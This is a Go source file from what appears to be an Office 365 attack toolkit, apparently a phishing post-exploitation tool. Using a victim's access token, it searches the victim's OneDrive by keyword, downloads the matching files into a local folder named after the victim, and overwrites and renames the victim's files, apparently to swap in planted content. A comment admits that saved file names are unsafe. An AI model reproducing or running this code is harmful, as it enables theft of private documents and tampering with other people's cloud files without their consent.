package api

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"o365-attack-toolkit/model"
	"os"
	"path/filepath"
)

func renameFile(user model.User, id string, filename string) {

	endpoint := fmt.Sprintf("/me/drive/items/%s", id)

	content := []byte(fmt.Sprintf(`{"name":"%s"}`, filename))
	CallAPIMethod("PATCH", endpoint, user.AccessToken, "", content, "application/json")

}
func UpdateFile(user model.User, id string, fileName string, fileContent []byte, fileContentType string) (string, int) {

	endpoint := fmt.Sprintf("/me/drive/items/%s/content", id)

	// Upload the file
	rsp, code := CallAPIMethod("PUT", endpoint, user.AccessToken, "", fileContent, fileContentType)

	renameFile(user, id, fileName)

	return rsp, code

}

func GetKeywordFiles(user model.User, searchKeyword string, query string) model.Files {

	var tempFiles model.Files
	endpoint := fmt.Sprintf("/me/drive/root/microsoft.graph.search(q='%s')", searchKeyword)

	filesResponse, _ := CallAPIMethod("GET", endpoint, user.AccessToken, query, nil, "")
	json.Unmarshal([]byte(filesResponse), &tempFiles)
	return tempFiles
}

func LiveDownloadFile(user model.User, fileID string) {
	// Download the files
	endpoint := fmt.Sprintf("/me/drive/items/%s/", fileID)
	driveItemResponse, _ := CallAPIMethod("GET", endpoint, user.AccessToken, "", nil, "")
	driveItem := model.DriveItem{}
	json.Unmarshal([]byte(driveItemResponse), &driveItem)
	log.Printf("Downloading %s", driveItem.Name)

	folderDir := fmt.Sprintf("./downloads/%s", user.UserPrincipalName)
	if _, err := os.Stat(folderDir); err != nil {
		if os.IsNotExist(err) {
			// Create the folder
			os.Mkdir(folderDir, os.ModePerm)
		} else {
			log.Println(err)
		}
	}
	// This function is a little bit unsafe because someone can plant files on your computer with the extension they want.

	//time := time.Now().Unix
	//downFile := fmt.Sprintf("%s/%s_%d",folderDir,filepath.Base(fileName),time)
	downFile := fmt.Sprintf("%s/%s", folderDir, filepath.Base(driveItem.Name))

	resp, err := http.Get(driveItem.MicrosoftGraphDownloadURL)
	if err != nil {
		log.Println(err)
	}
	defer resp.Body.Close()

	out, err := os.Create(downFile)
	if err != nil {
		log.Println(err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)

}
